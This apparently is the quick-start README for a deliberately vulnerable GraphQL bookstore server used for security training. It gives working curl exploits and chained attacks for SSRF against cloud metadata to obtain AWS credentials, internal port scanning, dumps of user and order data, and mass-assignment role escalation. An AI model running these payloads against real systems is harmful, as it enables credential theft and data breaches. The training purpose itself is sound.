# Quick Start Guide

## Installation & Build

### Prerequisites
This project requires minimal dependencies and builds without external GraphQL libraries.

```bash
# Basic build tools (usually pre-installed)
sudo apt-get install build-essential g++
```

### Quick Build (Simple Version)
The server can be compiled directly with g++:

```bash
# Compile the server
g++ -std=c++17 -o bookstore-server src/main.cpp

# Run the server
./bookstore-server
```

The server will start on port 4000.

### Full Build (with Database Support)
For full functionality including database operations:

```bash
# Install dependencies
sudo apt-get install build-essential cmake pkg-config libpq-dev libssl-dev libjwt-dev libcurl4-openssl-dev

# Build with CMake
mkdir build && cd build
cmake ..
make -j$(nproc)

# Run the full server
./bookstore-api
```

## Access the API

- **GraphQL Playground**: http://localhost:4000/
- **GraphQL Endpoint**: http://localhost:4000/graphql

## Testing the Vulnerabilities

### 1. Excessive Data Exposure (Password Hashes)

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { me { id email role passwordHash } }"}'
```

**Response**: Returns password hash in plain sight.

### 2. SSRF - Cloud Metadata Access (CRITICAL)

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { _fetchExternalResource(url: \"http://169.254.169.254/latest/meta-data/\") }"}'
```

**Response**: Accesses cloud instance metadata service.

### 3. SSRF - Internal Network Scanning

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { _fetchExternalResource(url: \"http://localhost:6379/\") }"}'
```

**Response**: Detects Redis database service.

### 4. BOLA - Access Other Users' Data

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { _internalUserSearch(email: \"admin\") }"}'
```

**Response**: Returns all users including their password hashes, phones, and addresses.

### 5. BOLA - Access All Orders

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { _internalOrdersByDate(startDate: \"2020-01-01\", endDate: \"2025-12-31\") }"}'
```

**Response**: Returns all orders with payment details and billing addresses.

### 6. Mass Assignment - Role Escalation

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { updateProfile(input: {role: \"admin\"}) { id role } }"}'
```

**Response**: Allows changing user role (when combined with authentication).

## Sample GraphQL Queries

### Playground Interface

Open http://localhost:4000/ in your browser to use the interactive playground.

Try these queries:

```graphql
# Get current user (exposes password hash)
query {
  me {
    id
    email
    role
    passwordHash
  }
}

# SSRF - Access cloud metadata
query {
  _fetchExternalResource(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
}

# BOLA - Search all users (access password hashes)
query {
  _internalUserSearch(email: "") {
    id
    email
    role
    passwordHash
    phone
    address
  }
}

# BOLA - Get all orders
query {
  _internalOrdersByDate {
    id
    orderNumber
    totalAmount
    userEmail
    paymentStatus
  }
}

# SSRF - Validate webhook URL
query {
  _validateWebhookUrl(url: "http://localhost:8080/callback")
}

# SSRF - Import users from external URL
mutation {
  _importUsers(fileUrl: "http://malicious-site.com/users.json")
}

# Mass Assignment - Update profile (allows role change)
mutation {
  updateProfile(input: {
    email: "newemail@test.com",
    role: "admin",
    phone: "555-0000"
  }) {
    id
    role
  }
}
```

## Exploit Chains

### Chain 1: SSRF to Cloud Credentials

```bash
# Step 1: Access cloud instance metadata
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { _fetchExternalResource(url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\") }"}'

# Step 2: Extract role name from response
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { _fetchExternalResource(url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]\") }"}'

# Step 3: Get temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)
```

### Chain 2: BOLA to Full User Dump

```bash
# Step 1: Enumerate all users
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { _internalUserSearch(email: \"\") }"}' > users.json

# Step 2: Get all orders with payment details
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { _internalOrdersByDate }"}' > orders.json

# Step 3: Correlate data - map users to their orders
```

### Chain 3: Internal Network Recon

```bash
# Step 1: Scan for common internal services
for port in 22 80 443 3306 5432 6379 8080 9200 27017; do
  curl -s -X POST http://localhost:4000/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"query { _fetchExternalResource(url: \\\"http://localhost:$port/\\\") }\"}"
done

# Step 2: For discovered services, use deeper SSRF probes
```

## Stopping the Server

```bash
# Kill the server process
pkill bookstore-server
```

## Next Steps

- Read `VULNERABILITIES.md` for detailed explanations
- Explore the full GraphQL schema via introspection:
  ```graphql
  query {
    __schema {
      queryType { fields { name } }
      mutationType { fields { name } }
    }
  }
  ```
- Try building your own exploit chains
- Practice defensive techniques: add rate limiting, input validation, proper authorization

## Important Notes

- This server is deliberately vulnerable - DO NOT use in production
- The simple version (bookstore-server) works without database
- The full version requires PostgreSQL to be running
- All vulnerabilities are intentionally implemented for educational purposes

## Troubleshooting

### Port already in use
```bash
# Check what's using port 4000
lsof -i :4000
# Kill the process
kill -9 [PID]
```

### Compilation errors
- Ensure you're using C++17 or later: `g++ --version`
- Check that all required headers are available in `/usr/include`

### Server not responding
- Check if server is running: `ps aux | grep bookstore`
- Check if port is listening: `netstat -tlnp | grep 4000`
- Check firewall rules: `sudo iptables -L`
